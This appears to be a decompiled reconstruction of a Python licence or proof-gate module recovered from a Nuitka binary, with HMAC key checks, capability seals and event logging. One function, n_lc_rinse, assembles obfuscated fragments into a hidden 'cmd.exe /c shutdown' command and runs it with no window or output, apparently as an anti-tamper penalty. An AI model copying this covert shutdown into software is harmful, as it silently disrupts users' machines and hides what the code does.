# Recovered module: src.py.com.yun.mao.fea._lk_ps_file
# Static reconstruction from the Nuitka module table, constant chunk and the
# module init at 0x569d320.
#
# The odd/even command assembly and proof-gate order are confirmed by the
# decompiled ``wt_fm_dash`` body.
from __future__ import annotations

import hashlib
import hmac
import subprocess
import time
from typing import Any

from ..link._fds_jm import sec
from . import _cmd_ops, _pl_wd_file

# Module metadata
# nuitka_table_index = 1790
# module_init_rva = 0x569d320
# flags = 0x10


def _tg(n: int) -> bytes:
    """Return the private six-byte witness (17 -> 165 -> 255 mix)."""

    value = int(n)
    mixed = bytes((((value * 17) ^ 165) & 255) for _ in range(4))
    return mixed + value.to_bytes(2, "big")


def _hmac_join(key: bytes, chunks: tuple) -> bytes:
    ctx = hmac.new(bytes(key), digestmod=hashlib.sha256)
    if isinstance(chunks, (bytes, bytearray, memoryview)):
        chunks = (chunks,)
    for chunk in chunks:
        ctx.update(bytes(chunk))
    return ctx.digest()


def _tag_of(tag: bytes) -> bool:
    return isinstance(tag, (bytes, bytearray, memoryview)) and bool(bytes(tag))


def _cap_valid(tag: bytes, cap: Any) -> bool:
    try:
        return bool(_pl_wd_file._unseal(bytes(tag), cap))
    except (AssertionError, TypeError, ValueError):
        return False


def _digest_kid(kid: str) -> bytes:
    return hashlib.sha256(str(kid or "").encode("utf-8")).digest()


def _mac_kid(kid: str) -> bytes:
    try:
        return bytes(_pl_wd_file._kid_mac(str(kid or "")))
    except (AssertionError, TypeError, ValueError):
        return b""


def _noise(u: int) -> int:
    """Mix one integer with the module's confirmed arithmetic slots.

    The decompiled body confirms ``v * 2400959708 + 1860803457``, the 32-bit
    mask, the 13/19-bit shifts and the final ``^ 11``.
    """

    value = int(u)
    mixed = (value * 2400959708 + 1860803457) & 0xFFFFFFFF
    return ((mixed << 13) ^ (mixed >> 19) ^ 11) & 0xFFFFFFFF


def _ready() -> bool:
    return bool(_pl_wd_file._ready and _pl_wd_file._sk is not None)


def _all_caps(obj: Any) -> bool:
    if obj is None:
        return False
    caps = getattr(obj, "caps", None)
    if caps is None:
        caps = getattr(obj, "_caps", None)
    if caps is None:
        cap = getattr(obj, "cap", None)
        caps = () if cap is None else (cap,)
    if isinstance(caps, _pl_wd_file._Cap):
        caps = (caps,)
    try:
        tag = getattr(obj, "tag", b"") or getattr(obj, "_tag", b"")
        return bool(caps) and all(_cap_valid(tag, cap) for cap in caps)
    except (TypeError, ValueError):
        return False


def _kid_match(obj: Any, kid: str, exp: Any) -> bool:
    digest = _digest_kid(kid)
    got = _pl_wd_file._kid_ring.get(digest)
    try:
        expected = bytes(exp) if exp is not None else _mac_kid(kid)
    except (TypeError, ValueError):
        return False
    return bool(got) and bool(expected) and hmac.compare_digest(bytes(got), expected)


def _record(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    try:
        repeated = bool(_pl_wd_file._bump_suspect_locked(float(now)))
    except (AttributeError, TypeError, ValueError):
        repeated = False
    try:
        _pl_wd_file.q_lg(int(reason), int(reason), int(entry), int(n), int(ph))
    except (AttributeError, TypeError, ValueError):
        pass
    return repeated


def _acct_ok(obj: Any, _sq_jqm: Any = None, fn: Any = None) -> bool:
    if callable(fn):
        try:
            return bool(fn(obj))
        except Exception:
            return False
    module = _sq_jqm or _cmd_ops.load_attr("src.py.com.yun.mao.fea._sq_jqm")
    info = getattr(module, "current_account_info", None)
    ensure = getattr(info, "ensure_valid", None)
    if callable(ensure):
        try:
            return bool(ensure())
        except Exception:
            return False
    return bool(getattr(info, "ucode", ""))


def _seal_ok(obj: Any) -> bool:
    return _all_caps(obj)


def _fan_hooks(obj: Any) -> bool:
    result = _cmd_ops.optional_call(
        obj,
        ("proof_ok", "_proof_ok", "on_proof_ok", "fan_hooks"),
    )
    return bool(result) if result is not None else False


def n_lc_rinse() -> None:
    """Interleave the encoded fragments and run ``cmd.exe /c shutdown ...``."""

    _sy = (
        sec("ej_wk_2h"),
        sec("ty_rc_0v"),
        sec("zi_df_8q"),
        sec("cs_pv_5x"),
    )
    _z = (
        sec("gp_nx_6b"),
        sec("wa_lm_4s"),
        sec("bk_uo_1g"),
    )
    _sp = subprocess
    _odd = _sy
    _eve = _z
    _parts = []
    for _i in range(max(len(_odd), len(_eve))):
        if _i < len(_odd):
            _parts.append(_odd[_i])
        if _i < len(_eve):
            _parts.append(_eve[_i])
    _line = "".join(_parts)
    _shell = False
    _slash_c = sec("la_zf_4n")
    _slash_c = _slash_c + sec("oc_qi_8m")
    _slash_c = _slash_c + sec("sn_vb_1t")
    _slash_c = _slash_c + sec("bn_qw_1x")
    _cf = _sp.CREATE_NO_WINDOW
    try:
        _sp.Popen(
            (_slash_c, sec("dm_fx_5q") + sec("ta_mj_2d"), _line),
            shell=_shell,
            stdin=_sp.DEVNULL,
            stdout=_sp.DEVNULL,
            stderr=_sp.DEVNULL,
            creationflags=_cf,
        )
    except Exception:
        pass


def wt_fm_dash(obj: Any = None) -> bool:
    """Evaluate the local proof gate and dispatch the optional hook."""

    now = time.time()
    try:
        with _pl_wd_file._g_mz:
            _ent = bool(_ready())
            _c = bool(_all_caps(obj))
            kid = getattr(obj, "kid", "") or getattr(obj, "ucode", "")
            _k = bool(_kid_match(obj, str(kid), getattr(obj, "kid_mac", None)))
            first = bool(_ent and _pl_wd_file._ph)
            r0 = _pl_wd_file.w_cd(first, _k, _c, _ent)
            if r0 != 9:
                _record(now, r0, 6, _noise(len(_pl_wd_file._ph)), 0)
                return False
            go = bool(_seal_ok(obj) and _ent)
        if not go:
            _record(now, 5, 6, _noise(5), 0)
            return False
        _g = _fan_hooks(obj)
        return bool(_g or obj is None)
    except Exception:
        _record(now, 1, 6, 0, 0)
        return False


def r_v3_edge(obj: Any = None) -> None:
    """Public hook entry; the body reaches the proof hook dispatcher."""

    try:
        _fan_hooks(obj)
    except Exception:
        return None
    return None

